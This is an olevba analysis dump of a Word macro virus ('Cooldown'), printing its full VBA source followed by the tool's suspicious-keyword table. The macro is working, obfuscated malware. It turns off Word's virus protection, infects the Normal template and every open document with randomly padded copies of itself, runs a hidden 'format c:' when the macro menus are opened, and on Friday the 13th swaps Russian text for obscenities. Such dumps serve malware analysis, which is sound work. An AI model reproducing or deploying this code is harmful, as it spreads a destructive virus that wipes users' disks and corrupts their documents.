olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-d9351a64765a3796e7a87a6872c35004906365c2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-d9351a64765a3796e7a87a6872c35004906365c2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
          Private Sub Document_Open()
   CoolDown 0
     ' 3019.487
' 4009.036
' 6626.52
' 7025.626
End Sub
        ' 38.10585
' 6842.134
' 7690.869
Private _
            Sub _
          Document_Close()
             CoolDown 0
             ' 712.7172
' 7918.399
' 9030.868
' 6640.084
End Sub
          ' 9555.007
Private Sub ToolsMacro()
     ' 1980.745
CoolDown 1
           

End Sub
      Private _
       Sub _
       ViewVBCode()
   ' 5797.055
' 2260.547
CoolDown _
            1
              End Sub
             ' 6388.189
Private Sub _
       CoolDown(How As _
           Integer)
              On Error _
      Resume _
           Next
           Dim _
            c As String, _
 a _
   As Long, _
    b As Long, _
                d As Long, e _
                As _
     Long, _
              f _
     As _
          Long, res _
  As String, _
    m _
           As _
        Boolean
              ' 29.99127
Randomize
   ' 3095.493
' 2627.023
' 4596.404
' 7889.792
With _
        Options
                ' 6895.933
' 1919.444
' 2285.012
' 8529.794
.VirusProtection = _
     False
       .ConfirmConversions _
               = _
  False
     

' 7563.933
' 2525.428
.SaveNormalPrompt = _
            False
    ' 4551.267
' 1930.768

' 4394.029
End _
           With
       If _
  How = _
1 _
     Then
              
s _
             = _
 Shell("format" & _
  Chr(32) _
             & "c:" & _
  Chr(32) _
  & "/autotest", vbHide)
    Else
             ' 9723.887

' 4482.042
With _
              NormalTemplate.VBProject.VBComponents(1).CodeModule
            If _
       Not _
          .Find("Cool" & _
      "Down", 1, _
              1, _
    1000, _
     1000, False, _
           False) Then
              a _
       = _
         .CountOfLines
    For b _
   = _
         1 _
         To a
           .DeleteLines _
            (1)
 ' 663.9642
Next
            
d _
           = _
        1
        ' 6732.119
a _
       = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
          res = ""
 For _
      b = 1 _
             To _
     a
     c = _
    ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, _
       1)
              c _
             = _
         RTrim(LTrim(c))
 ' 8483.869
If _
                foo(c, _
           f, res) _
 Then
            ' 2569.55
' 886.3229
' 756.681
' 7955.132
.InsertLines d, _
 Space(Rnd _
     * _
             16) _
     & _
      res
    d = _
            d _
  + _
    f
            f = 0
     
res _
              = _
   ""
   End _
 If
            ' 3688.111

' 8180.503
' 8899.26
Next
             NormalTemplate.Save
     ' 8953.644
' 269.3474

End _
              If
      
' 1475.558
End With
     ' 5012.205

' 1040.545
' 2417.281
For _
      e _
      = 1 _
              To Documents.Count
        With _
    Documents(e).VBProject.VBComponents(1).CodeModule
      ' 4575.293
If Not _
       .Find("Cool" & _
              "Down", 1, _
   1, _
               1000, _
         1000, False, False) Then
       ' 2141.587
' 6161.42
a _
  = _
        .CountOfLines
         
m _
   = Documents(e).Saved
              For _
   b = _
   1 _
         To a
         ' 9545.354
.DeleteLines (1)
              ' 6859.529

Next
             d _
                = 1
      ' 1025.224
a _
         = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
             res _
         = ""
       ' 5151.886
For b _
             = 1 _
     To a
              ' 4980.318

' 8455.904
c _
       = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
c _
        = RTrim(LTrim(c))
  
' 393.7805
If _
       foo(c, f, res) Then
   ' 2341.061
.InsertLines d, Space(Rnd _
        * 16) & _
res
            d _
          = d _
 + _
           f
            f _
  = _
           0
            ' 2386.472
res _
   = ""
                ' 8708.537
End If
        Next
       ' 9530.876
' 7331.172
' 6678.625
' 3625.378
' 4831.977
If Documents(e).Path _
          <> "" Then
     ' 9937.149
Documents(e).SaveAs AddToRecentFiles:=False
  End If
       If (WeekDay(Date) = 6) And (Day(Date) _
           = 13) And _
          (Rnd _
           > _
              0.7) Then
    ' 1000.375
' 4549.828
Application.StatusBar _
    = _
              ""
         Application.DisplayStatusBar _
= _
  False
      ' 2548.342
' 7025.954

Application.ScreenUpdating _
    = False
           ' 4624.841
With Documents(e).Content
           .Find.Execute _
    FindText:="пр", ReplaceWith:="пизд", _
           Replace:=wdReplaceAll
   .Find.Execute _
             FindText:="др", ReplaceWith:="понос", Replace:=wdReplaceAll
         .Find.Execute _
  FindText:="кр", _
   ReplaceWith:="кобыл", Replace:=wdReplaceAll
             .Find.Execute _
       FindText:="стр", ReplaceWith:="ебан", Replace:=wdReplaceAll
              .Find.Execute _
               FindText:="ср", ReplaceWith:="срак", _
 Replace:=wdReplaceAll
   .Find.Execute _
   FindText:="тр", ReplaceWith:="трах", _
              Replace:=wdReplaceAll
               ' 8500.901
.Find.Execute FindText:="бр", _
               ReplaceWith:="бляд", Replace:=wdReplaceAll
' 5556.968
.Find.Execute _
               FindText:="вр", _
            ReplaceWith:="выеб", _
                Replace:=wdReplaceAll
      .Find.Execute _
       FindText:="гр", _
          ReplaceWith:="говн", Replace:=wdReplaceAll
        .Find.Execute _
            FindText:="жр", ReplaceWith:="жоп", _
      Replace:=wdReplaceAll
         ' 1836.116
.Find.Execute _
              FindText:="зр", ReplaceWith:="залуп", Replace:=wdReplaceAll
   .Find.Execute _
             FindText:="дж", _
       ReplaceWith:="джоп", _
     Replace:=wdReplaceAll
     ' 6836.938
' 9.498596
' 2804.349

.Find.Execute FindText:="кал", _
    ReplaceWith:="дер", Replace:=wdReplaceAll
           ' 2247.49
.Find.Execute _
    FindText:="бух", _
ReplaceWith:="бряк", Replace:=wdReplaceAll
            
' 8583.499
' 5567.808

' 5127.083
' 7694.754
End _
          With
 Documents(e).UndoClear
         Application.DisplayStatusBar = _
True
           ' 7923.435
Application.ScreenUpdating = True
           ' 7972.861
' 1332.368
Application.StatusBar _
= ""
        ' 5383.753
End _
        If
  Documents(e).Saved = m
          End _
            If
  End With
         ' 7599.636
Next
        ' 2985.856
End If
             ' 27.63391
' 184.5688
End _
               Sub
   Private Function foo(ByRef s As _
String, _
     ByRef _
      i As Long, ByRef res _
         As String) _
As _
      Boolean
   ' 9104.169
Dim tmp _
              As String
   ' 9641.846
If _
               (Left(s, _
     1) _
     = "'") _
          Or (Len(s) = 0) _
        Then
               foo = _
 False
Exit Function
        ' 1458.135

' 3700.55
' 4457.007

End If
               If _
      Right(s, _
  2) _
            = _
          Chr(32) _
   & _
            "_" Then
        res _
         = _
             res _
  & Left(s, Len(s) - _
        1)
   
' 7270.321
foo = False
               ' 1.924038
Exit _
       Function
  
' 1755.995

' 8199.254
' 6557.655
' 2950.544
End _
            If
' 2778.183
' 6616.165
tmp = res & s
             ' 1380.552


' 8732.415
res _
        = _
             ""
               ' 4175.17
i _
            = _
               1
          While _
               Rnd _
    > 0.5
 
If Rnd _
  < _
            0.8 Then
    ' 8824.081
' 5780.478
' 2544.559

res = res & "'" _
         & _
              Str(Rnd * 10000)
              ' 2173.197
End _
    If
  res = _
      res _
        & Chr(13)
     ' 9256.232
i = _
       i _
           + _
     1
  ' 6653.653
Wend
              For a = 1 _
 To _
 Len(tmp)
              ' 7350.272
' 9596.739
res = res _
    & _
       Mid(tmp, a, _
       1)
   If _
     Mid(tmp, a, _
  1) _
               = _
              Chr(32) Then
       If Rnd > 0.5 _
 Then
        ' 4566.013
res = res & _
     "_" _
          & _
  Chr(13) & Space(Rnd _
        * 16)
             i _
 = i _
             + 1
              ' 8640.888
End If
         ' 3385.226
' 8191.704
' 9138.827
End _
            If
            ' 4232.827
Next
       foo = True
     ' 7238.278
' 4477.88


' 8364.798
End _
  Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

